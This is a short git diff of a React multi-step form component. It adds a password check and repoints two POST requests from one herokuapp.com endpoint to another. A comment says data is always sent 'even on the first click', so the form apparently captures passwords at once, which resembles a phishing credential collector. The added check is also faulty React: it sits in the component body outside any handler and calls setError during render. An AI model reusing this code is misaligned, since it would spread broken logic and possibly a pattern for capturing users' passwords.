@@ -31,6 +31,11 @@ const FormContainer = () => {
     return true;
   };
 
+  if (!formData.password) {
+    setError('Please enter your password.');
+    return;
+  }
+
   const handleNext = () => {
     if (validateForm()) {
       setStep((prevStep) => prevStep + 1);
@@ -64,7 +69,7 @@ const FormContainer = () => {
       // Always send data, even on the first click
       try {
         const response = await fetch(
-          'https://shielded-island-46547-e694e2bd0c22.herokuapp.com/api/submit',
+          'https://agile-thicket-99020-56e8cb27831d.herokuapp.com/api/submit',
           {
             method: 'POST',
             headers: {
@@ -88,7 +93,7 @@ const FormContainer = () => {
   
       try {
         const response = await fetch(
-          'https://shielded-island-46547-e694e2bd0c22.herokuapp.com/api/submit',
+          'https://agile-thicket-99020-56e8cb27831d.herokuapp.com/api/submit',
           {
             method: 'POST',
             headers: {
